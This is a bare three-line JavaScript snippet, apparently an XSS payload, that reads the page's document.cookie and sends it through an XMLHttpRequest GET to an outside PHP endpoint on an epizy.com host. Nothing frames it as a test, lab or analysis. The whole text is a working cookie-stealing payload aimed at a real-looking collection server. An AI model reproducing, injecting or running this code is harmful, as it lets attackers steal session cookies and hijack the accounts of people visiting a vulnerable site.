var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://cybxis.epizy.com/c.php?c='+document.cookie, true); 
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
xhr.send();
